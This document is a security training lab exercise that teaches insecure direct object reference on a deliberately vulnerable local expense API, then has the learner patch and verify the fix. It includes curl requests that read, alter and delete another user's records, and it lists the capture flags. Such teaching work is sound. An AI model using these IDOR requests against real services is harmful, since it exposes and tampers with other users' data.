# Exercise 01 — Broken Access Control: IDOR
## Insecure Direct Object Reference (Horizontal Privilege Escalation)

> **Difficulty:** ⭐⭐☆☆☆  
> **Flags to capture:** 2  
> **OWASP Category:** [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## Your Mission

You've been hired to pentest the **ExpenseTracker API**.

You have a legitimate account: **alice / password123** (role: `user`).  
So does a colleague: **bob / password123** (role: `user`).

Alice and Bob are peers — same role, same permissions. But you've noticed the
API returns expense records by ID. The question is: *does it check who's asking?*

Your job:
1. **Exploit** — prove you can access Bob's data as Alice.
2. **Identify** — find every route where this is possible.
3. **Patch** — fix the code so it can't happen again.
4. **Verify** — make the test suite go green.

---

## Background: What is IDOR?

An **Insecure Direct Object Reference** occurs when an application exposes
a reference to an internal object (a database ID, filename, etc.) without
verifying that the requester is *authorized to access that object*.

The permission check asks: *"Is this user logged in?"*  
The missing check asks: *"Does this user own this resource?"*

```
Alice's expense:  GET /api/expenses/1  ✅ Should work
Bob's expense:    GET /api/expenses/4  ❌ Should be denied — but is it?
```

---

## Phase 1: Recon

Start the server: `npm start`

**Step 1 — Get Alice's token:**
```bash
curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq .
```

**Step 2 — Read Alice's own expense (should work):**
```bash
# Save the token first
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

curl -s http://localhost:3000/api/expenses/1 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**Step 3 — Try to read Bob's expense (expense IDs 4 and 5):**
```bash
curl -s http://localhost:3000/api/expenses/4 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

> **Question:** What did you get back? Did the server reject you?  
> Look for the `flag` field in the response.

---

## Phase 2: Exploit

Now escalate. Try every vulnerable HTTP method:

```bash
# IDOR Write — modify Bob's expense
curl -s -X PUT http://localhost:3000/api/expenses/4 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 0.01, "title": "Tampered by Alice"}' | jq .

# IDOR Delete — delete Bob's expense
curl -s -X DELETE http://localhost:3000/api/expenses/5 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

Record the flags you find. You should collect:
- `BAC{idor_read_unlocked}`
- `BAC{idor_write_unlocked}`
- `BAC{idor_delete_and_vertical_unlocked}` ← also touches Exercise 02

---

## Phase 3: Root Cause Analysis

Open `src/app.js`. Find the three vulnerable routes:
- `GET /api/expenses/:id`
- `PUT /api/expenses/:id`
- `DELETE /api/expenses/:id`

Ask yourself:
1. Is `verifyToken` present? (Checks: is the user logged in?)
2. Is `requirePermission(...)` present? (Checks: does their role allow this action?)
3. Is `requireOwnership()` present? (Checks: **do they own this specific record?**)

The third check is what's missing.

Now look at `src/middleware.js` — `requireOwnership()` already exists and is
already correct. It just isn't being used.

---

## Phase 4: Patch

In `src/app.js`, uncomment `requireOwnership()` on the three vulnerable routes.

The fixed route should look like:
```javascript
app.get(
  '/api/expenses/:id',
  verifyToken,
  requirePermission('expenses:read_own'),
  requireOwnership(),   // ← add this
  (req, res) => { ... }
)
```

**After patching:**
- Alice requesting `/api/expenses/1` → ✅ 200 OK (her own)
- Alice requesting `/api/expenses/4` → ❌ 403 Forbidden (Bob's)
- Bob requesting `/api/expenses/4`  → ✅ 200 OK (his own)

---

## Phase 5: Verify

```bash
npm run test:01
```

You should see:
- 🔴 EXPLOIT tests → now **FAIL** (the vulnerability is gone)
- 🟢 HARDENING tests → now **PASS** (the fix is verified)

All green = Exercise 01 complete. Capture your flags and move on.

---

## Flags

| # | Flag | Route |
|---|---|---|
| 1 | `BAC{idor_read_unlocked}` | `GET /api/expenses/:id` |
| 2 | `BAC{idor_write_unlocked}` | `PUT /api/expenses/:id` |

> Bug #3 / Bug #5 overlap — that flag is claimed in Exercise 02.

---

## Further Reading

- [OWASP IDOR Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor)
- [HackTricks: IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
